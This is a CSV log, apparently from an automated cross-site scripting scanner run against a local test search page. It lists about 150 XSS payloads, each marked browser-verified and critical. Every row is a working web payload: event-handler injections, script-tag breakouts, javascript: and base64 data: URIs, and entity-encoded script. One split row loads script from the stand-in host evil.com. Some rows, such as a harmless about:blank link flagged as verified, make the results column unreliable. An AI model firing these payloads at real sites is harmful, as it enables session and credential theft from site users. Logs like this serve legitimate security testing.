Payload_Start_Time,Payload_End_Time,Duration_Seconds,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
2026-01-10 16:23:32.701,2026-01-10 16:23:32.704,0.003,http://localhost:3000/search,GET,q,<div data-x=x onclick=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.704,2026-01-10 16:23:32.707,0.002,http://localhost:3000/search,GET,q,<input accesskey=x onclick=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.707,2026-01-10 16:23:32.714,0.007,http://localhost:3000/search,GET,q,<div contenteditable oninput=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.714,2026-01-10 16:23:32.719,0.005,http://localhost:3000/search,GET,q,<input type=hidden onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.719,2026-01-10 16:23:32.722,0.003,http://localhost:3000/search,GET,q,<select><option oninput=alert(1)>X</option></select>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.722,2026-01-10 16:23:32.725,0.003,http://localhost:3000/search,GET,q,"<img/src=""x""/onerror=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.725,2026-01-10 16:23:32.733,0.008,http://localhost:3000/search,GET,q,<img%20src=x%20onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.733,2026-01-10 16:23:32.736,0.003,http://localhost:3000/search,GET,q,<img	src=x	onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.736,2026-01-10 16:23:32.739,0.003,http://localhost:3000/search,GET,q,<script	>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.739,2026-01-10 16:23:32.741,0.002,http://localhost:3000/search,GET,q,<script,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.741,2026-01-10 16:23:32.749,0.007,http://localhost:3000/search,GET,q,>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.749,2026-01-10 16:23:32.752,0.003,http://localhost:3000/search,GET,q,<script,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.752,2026-01-10 16:23:32.755,0.003,http://localhost:3000/search,GET,q,src=//evil.com></script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.755,2026-01-10 16:23:32.758,0.003,http://localhost:3000/search,GET,q,<svg/onload=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.758,2026-01-10 16:23:32.767,0.009,http://localhost:3000/search,GET,q,<svg/onload=confirm(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.767,2026-01-10 16:23:32.770,0.003,http://localhost:3000/search,GET,q,<svg/onload=print()>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.770,2026-01-10 16:23:32.772,0.002,http://localhost:3000/search,GET,q,<marquee onstart=prompt(1)>X</marquee>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.772,2026-01-10 16:23:32.778,0.006,http://localhost:3000/search,GET,q,<marquee onstart=confirm(1)>X</marquee>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.778,2026-01-10 16:23:32.783,0.004,http://localhost:3000/search,GET,q,<iframe/src=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.783,2026-01-10 16:23:32.785,0.003,http://localhost:3000/search,GET,q,<iframe/onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.785,2026-01-10 16:23:32.788,0.003,http://localhost:3000/search,GET,q,<iframe%20src=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.788,2026-01-10 16:23:32.791,0.002,http://localhost:3000/search,GET,q,<object/data=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.791,2026-01-10 16:23:32.797,0.007,http://localhost:3000/search,GET,q,"<object data=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="">",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.797,2026-01-10 16:23:32.802,0.004,http://localhost:3000/search,GET,q,<embed/src=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.802,2026-01-10 16:23:32.804,0.003,http://localhost:3000/search,GET,q,"<embed src=data:text/html,<script>alert(1)</script>>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.804,2026-01-10 16:23:32.807,0.003,http://localhost:3000/search,GET,q,<var onmouseover=alert(1)>X</var>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.807,2026-01-10 16:23:32.814,0.007,http://localhost:3000/search,GET,q,<code onmouseover=alert(1)>X</code>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.814,2026-01-10 16:23:32.819,0.004,http://localhost:3000/search,GET,q,<span onmouseover=alert(1)>X</span>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.819,2026-01-10 16:23:32.822,0.003,http://localhost:3000/search,GET,q,<p onmouseover=alert(1)>X</p>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.822,2026-01-10 16:23:32.825,0.003,http://localhost:3000/search,GET,q,<h1 onmouseover=alert(1)>X</h1>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.825,2026-01-10 16:23:32.828,0.002,http://localhost:3000/search,GET,q,<h2 onmouseover=alert(1)>X</h2>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.828,2026-01-10 16:23:32.831,0.003,http://localhost:3000/search,GET,q,<pre onmouseover=alert(1)>X</pre>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.831,2026-01-10 16:23:32.838,0.007,http://localhost:3000/search,GET,q,<blockquote onmouseover=alert(1)>X</blockquote>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.838,2026-01-10 16:23:32.841,0.004,http://localhost:3000/search,GET,q,<ol onmouseover=alert(1)><li>X</li></ol>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.842,2026-01-10 16:23:32.845,0.003,http://localhost:3000/search,GET,q,<ul onmouseover=alert(1)><li>X</li></ul>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.845,2026-01-10 16:23:32.847,0.003,http://localhost:3000/search,GET,q,<li onmouseover=alert(1)>X</li>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.847,2026-01-10 16:23:32.854,0.006,http://localhost:3000/search,GET,q,<dl onmouseover=alert(1)><dt>X</dt></dl>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.854,2026-01-10 16:23:32.858,0.005,http://localhost:3000/search,GET,q,<dt onmouseover=alert(1)>X</dt>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.858,2026-01-10 16:23:32.861,0.003,http://localhost:3000/search,GET,q,<dd onmouseover=alert(1)>X</dd>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.861,2026-01-10 16:23:32.868,0.007,http://localhost:3000/search,GET,q,<fieldset onmouseover=alert(1)>X</fieldset>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.869,2026-01-10 16:23:32.872,0.003,http://localhost:3000/search,GET,q,<legend onmouseover=alert(1)>X</legend>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.872,2026-01-10 16:23:32.875,0.003,http://localhost:3000/search,GET,q,<label onmouseover=alert(1)>X</label>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.875,2026-01-10 16:23:32.878,0.003,http://localhost:3000/search,GET,q,<table><caption onmouseover=alert(1)>X</caption></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.878,2026-01-10 16:23:32.881,0.003,http://localhost:3000/search,GET,q,<table><colgroup onmouseover=alert(1)></colgroup></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.881,2026-01-10 16:23:32.888,0.007,http://localhost:3000/search,GET,q,<table><col onmouseover=alert(1)></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.888,2026-01-10 16:23:32.892,0.004,http://localhost:3000/search,GET,q,<table><thead onmouseover=alert(1)></thead></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.892,2026-01-10 16:23:32.896,0.003,http://localhost:3000/search,GET,q,<table><tbody onmouseover=alert(1)></tbody></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.896,2026-01-10 16:23:32.899,0.003,http://localhost:3000/search,GET,q,<table><tfoot onmouseover=alert(1)></tfoot></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.899,2026-01-10 16:23:32.908,0.009,http://localhost:3000/search,GET,q,<table><tr onmouseover=alert(1)></tr></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.908,2026-01-10 16:23:32.912,0.004,http://localhost:3000/search,GET,q,<table><th onmouseover=alert(1)>X</th></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.912,2026-01-10 16:23:32.920,0.008,http://localhost:3000/search,GET,q,<table><td onmouseover=alert(1)>X</td></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.920,2026-01-10 16:23:32.925,0.004,http://localhost:3000/search,GET,q,<meter onmouseover=alert(1)>X</meter>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.925,2026-01-10 16:23:32.929,0.004,http://localhost:3000/search,GET,q,<progress onmouseover=alert(1)>X</progress>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.929,2026-01-10 16:23:32.932,0.003,http://localhost:3000/search,GET,q,<output onmouseover=alert(1)>X</output>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.932,2026-01-10 16:23:32.940,0.008,http://localhost:3000/search,GET,q,<time onmouseover=alert(1)>X</time>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.940,2026-01-10 16:23:32.944,0.004,http://localhost:3000/search,GET,q,<mark onmouseover=alert(1)>X</mark>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.944,2026-01-10 16:23:32.948,0.004,http://localhost:3000/search,GET,q,<ruby onmouseover=alert(1)>X</ruby>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.948,2026-01-10 16:23:32.957,0.009,http://localhost:3000/search,GET,q,<ruby><rt onmouseover=alert(1)>X</rt></ruby>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.957,2026-01-10 16:23:32.962,0.005,http://localhost:3000/search,GET,q,<ruby><rp onmouseover=alert(1)>X</rp></ruby>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.962,2026-01-10 16:23:32.965,0.003,http://localhost:3000/search,GET,q,<bdi onmouseover=alert(1)>X</bdi>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.965,2026-01-10 16:23:32.969,0.004,http://localhost:3000/search,GET,q,<bdo onmouseover=alert(1)>X</bdo>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.969,2026-01-10 16:23:32.977,0.008,http://localhost:3000/search,GET,q,<wbr onmouseover=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.977,2026-01-10 16:23:32.980,0.003,http://localhost:3000/search,GET,q,<ins onmouseover=alert(1)>X</ins>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.980,2026-01-10 16:23:32.989,0.009,http://localhost:3000/search,GET,q,<del onmouseover=alert(1)>X</del>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.989,2026-01-10 16:23:32.994,0.004,http://localhost:3000/search,GET,q,<small onmouseover=alert(1)>X</small>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.994,2026-01-10 16:23:32.998,0.004,http://localhost:3000/search,GET,q,<strong onmouseover=alert(1)>X</strong>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.998,2026-01-10 16:23:33.005,0.007,http://localhost:3000/search,GET,q,<em onmouseover=alert(1)>X</em>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.005,2026-01-10 16:23:33.008,0.003,http://localhost:3000/search,GET,q,<b onmouseover=alert(1)>X</b>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.008,2026-01-10 16:23:33.013,0.004,http://localhost:3000/search,GET,q,<i onmouseover=alert(1)>X</i>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.013,2026-01-10 16:23:33.015,0.003,http://localhost:3000/search,GET,q,<u onmouseover=alert(1)>X</u>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.015,2026-01-10 16:23:33.022,0.007,http://localhost:3000/search,GET,q,<s onmouseover=alert(1)>X</s>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.022,2026-01-10 16:23:33.026,0.004,http://localhost:3000/search,GET,q,<sub onmouseover=alert(1)>X</sub>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.026,2026-01-10 16:23:33.030,0.004,http://localhost:3000/search,GET,q,<sup onmouseover=alert(1)>X</sup>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.030,2026-01-10 16:23:33.033,0.004,http://localhost:3000/search,GET,q,<abbr onmouseover=alert(1)>X</abbr>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.033,2026-01-10 16:23:33.040,0.007,http://localhost:3000/search,GET,q,<address onmouseover=alert(1)>X</address>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.040,2026-01-10 16:23:33.044,0.004,http://localhost:3000/search,GET,q,<article onmouseover=alert(1)>X</article>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.044,2026-01-10 16:23:33.047,0.003,http://localhost:3000/search,GET,q,<aside onmouseover=alert(1)>X</aside>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.047,2026-01-10 16:23:33.050,0.003,http://localhost:3000/search,GET,q,<footer onmouseover=alert(1)>X</footer>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.050,2026-01-10 16:23:33.058,0.008,http://localhost:3000/search,GET,q,<header onmouseover=alert(1)>X</header>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.058,2026-01-10 16:23:33.062,0.004,http://localhost:3000/search,GET,q,<hgroup onmouseover=alert(1)>X</hgroup>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.062,2026-01-10 16:23:33.066,0.004,http://localhost:3000/search,GET,q,<nav onmouseover=alert(1)>X</nav>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.066,2026-01-10 16:23:33.075,0.008,http://localhost:3000/search,GET,q,<section onmouseover=alert(1)>X</section>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.075,2026-01-10 16:23:33.080,0.005,http://localhost:3000/search,GET,q,<main onmouseover=alert(1)>X</main>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.080,2026-01-10 16:23:33.084,0.005,http://localhost:3000/search,GET,q,<figure onmouseover=alert(1)>X</figure>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.084,2026-01-10 16:23:33.092,0.008,http://localhost:3000/search,GET,q,<figcaption onmouseover=alert(1)>X</figcaption>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.092,2026-01-10 16:23:33.096,0.004,http://localhost:3000/search,GET,q,<dialog onmouseover=alert(1)>X</dialog>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.096,2026-01-10 16:23:33.100,0.004,http://localhost:3000/search,GET,q,<menu onmouseover=alert(1)>X</menu>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.100,2026-01-10 16:23:33.103,0.003,http://localhost:3000/search,GET,q,<menuitem onmouseover=alert(1)>X</menuitem>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.103,2026-01-10 16:23:33.111,0.008,http://localhost:3000/search,GET,q,<details><summary onmouseover=alert(1)>X</summary></details>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.111,2026-01-10 16:23:33.116,0.004,http://localhost:3000/search,GET,q,<canvas onmouseover=alert(1)>X</canvas>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.116,2026-01-10 16:23:33.120,0.004,http://localhost:3000/search,GET,q,<button onclick=alert(1)>X</button>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.120,2026-01-10 16:23:33.123,0.003,http://localhost:3000/search,GET,q,<button ondblclick=alert(1)>X</button>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.123,2026-01-10 16:23:33.131,0.008,http://localhost:3000/search,GET,q,<button onmousedown=alert(1)>X</button>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.131,2026-01-10 16:23:33.135,0.004,http://localhost:3000/search,GET,q,<button onmouseup=alert(1)>X</button>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.135,2026-01-10 16:23:33.139,0.003,http://localhost:3000/search,GET,q,"""><script>alert(1)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.139,2026-01-10 16:23:33.141,0.003,http://localhost:3000/search,GET,q,'><script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.141,2026-01-10 16:23:33.152,0.011,http://localhost:3000/search,GET,q,"""></script><script>alert(1)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.152,2026-01-10 16:23:33.156,0.004,http://localhost:3000/search,GET,q,';alert(1);//,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.156,2026-01-10 16:23:33.164,0.008,http://localhost:3000/search,GET,q,""";alert(1);//",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.164,2026-01-10 16:23:33.170,0.006,http://localhost:3000/search,GET,q,""" onmouseover=alert(1) x=""",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.170,2026-01-10 16:23:33.174,0.004,http://localhost:3000/search,GET,q,"""onmouseover=""alert(1)",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.174,2026-01-10 16:23:33.183,0.009,http://localhost:3000/search,GET,q,' onmouseover=alert(1) x=',RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.183,2026-01-10 16:23:33.188,0.005,http://localhost:3000/search,GET,q,""" autofocus onfocus=alert(1) x=""",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.188,2026-01-10 16:23:33.191,0.004,http://localhost:3000/search,GET,q,' autofocus onfocus=alert(1) x=',RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.191,2026-01-10 16:23:33.200,0.009,http://localhost:3000/search,GET,q,</script><script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.200,2026-01-10 16:23:33.203,0.003,http://localhost:3000/search,GET,q,</script><img src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.203,2026-01-10 16:23:33.207,0.003,http://localhost:3000/search,GET,q,</script><svg onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.207,2026-01-10 16:23:33.215,0.008,http://localhost:3000/search,GET,q,--><script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.215,2026-01-10 16:23:33.220,0.005,http://localhost:3000/search,GET,q,--!><script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.220,2026-01-10 16:23:33.223,0.003,http://localhost:3000/search,GET,q,<q/oncut=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.223,2026-01-10 16:23:33.231,0.008,http://localhost:3000/search,GET,q,<q/onclick=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.231,2026-01-10 16:23:33.236,0.005,http://localhost:3000/search,GET,q,<q/ondrag=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.236,2026-01-10 16:23:33.240,0.004,http://localhost:3000/search,GET,q,<q/onerror=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.240,2026-01-10 16:23:33.248,0.008,http://localhost:3000/search,GET,q,<a href=#x onclick=alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.248,2026-01-10 16:23:33.251,0.003,http://localhost:3000/search,GET,q,<a name=x onclick=alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.251,2026-01-10 16:23:33.256,0.005,http://localhost:3000/search,GET,q,<a href=x target=_blank onclick=alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.256,2026-01-10 16:23:33.263,0.008,http://localhost:3000/search,GET,q,"'"">><marquee onstart=confirm(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.264,2026-01-10 16:23:33.268,0.004,http://localhost:3000/search,GET,q,"'"">><marquee onstart=prompt(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.268,2026-01-10 16:23:33.271,0.003,http://localhost:3000/search,GET,q,"'"">><div onmouseover=alert(1)>X</div>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.271,2026-01-10 16:23:33.274,0.003,http://localhost:3000/search,GET,q,<img src=x oneonerrorrror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.274,2026-01-10 16:23:33.281,0.008,http://localhost:3000/search,GET,q,<img src=x onerror=alert(1) onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.281,2026-01-10 16:23:33.286,0.004,http://localhost:3000/search,GET,q,<button formaction=javascript:alert(1)>X</button>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.286,2026-01-10 16:23:33.289,0.003,http://localhost:3000/search,GET,q,<input type=submit formaction=javascript:alert(1) value=X>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.289,2026-01-10 16:23:33.297,0.008,http://localhost:3000/search,GET,q,<form action=javascript:alert(1)><button>X</button></form>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.297,2026-01-10 16:23:33.300,0.004,http://localhost:3000/search,GET,q,<video poster=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.301,2026-01-10 16:23:33.304,0.003,http://localhost:3000/search,GET,q,<html manifest=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.304,2026-01-10 16:23:33.307,0.003,http://localhost:3000/search,GET,q,<html xmlns:xss><xss:script>alert(1)</xss:script></html>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.307,2026-01-10 16:23:33.314,0.007,http://localhost:3000/search,GET,q,<img lowsrc=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.314,2026-01-10 16:23:33.318,0.004,http://localhost:3000/search,GET,q,<img dynsrc=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.318,2026-01-10 16:23:33.321,0.003,http://localhost:3000/search,GET,q,<a href=vbscript:msgbox(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.321,2026-01-10 16:23:33.324,0.003,http://localhost:3000/search,GET,q,<a href=about:blank>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.324,2026-01-10 16:23:33.333,0.009,http://localhost:3000/search,GET,q,"<input pattern="".*"" title=""test"" onmouseover=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.333,2026-01-10 16:23:33.336,0.003,http://localhost:3000/search,GET,q,"<input placeholder=""test"" onmouseover=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.336,2026-01-10 16:23:33.340,0.003,http://localhost:3000/search,GET,q,"<div title=""test"" onmouseover=alert(1)>X</div>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.340,2026-01-10 16:23:33.347,0.007,http://localhost:3000/search,GET,q,"<img alt=""test"" src=x onerror=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.347,2026-01-10 16:23:33.351,0.004,http://localhost:3000/search,GET,q,<blockquote cite=javascript:alert(1)>X</blockquote>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.351,2026-01-10 16:23:33.354,0.003,http://localhost:3000/search,GET,q,<img longdesc=javascript:alert(1) src=x>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.354,2026-01-10 16:23:33.357,0.003,http://localhost:3000/search,GET,q,<img usemap=#x src=x><map name=x><area onclick=alert(1)></map>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.357,2026-01-10 16:23:33.364,0.007,http://localhost:3000/search,GET,q,<img ismap src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.364,2026-01-10 16:23:33.368,0.004,http://localhost:3000/search,GET,q,<input dirname=test onchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.368,2026-01-10 16:23:33.372,0.004,http://localhost:3000/search,GET,q,<svg><script>alert&#40;1&#41;</script></svg>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.372,2026-01-10 16:23:33.374,0.003,http://localhost:3000/search,GET,q,<svg><script>alert&#x28;1&#x29;</script></svg>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.374,2026-01-10 16:23:33.383,0.009,http://localhost:3000/search,GET,q,<svg><script>&#97;lert(1)</script></svg>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.383,2026-01-10 16:23:33.387,0.004,http://localhost:3000/search,GET,q,"<div style=""xss:expression(alert(1))"">X</div>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.387,2026-01-10 16:23:33.390,0.003,http://localhost:3000/search,GET,q,"<div style=""background:expression(alert(1))"">X</div>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.390,2026-01-10 16:23:33.397,0.008,http://localhost:3000/search,GET,q,"<script type=importmap>{""imports"":{""x"":""javascript:alert(1)""}}</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.397,2026-01-10 16:23:33.401,0.004,http://localhost:3000/search,GET,q,<div id=x><template shadowroot=open><style>*{color:red}</style><img src=x onerror=alert(1)></template></div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.401,2026-01-10 16:23:33.404,0.003,http://localhost:3000/search,GET,q,"<iframe src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:33.404,2026-01-10 16:23:33.408,0.003,http://localhost:3000/search,GET,q,"<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>",RAW_REFLECTION,Yes,alert,Critical
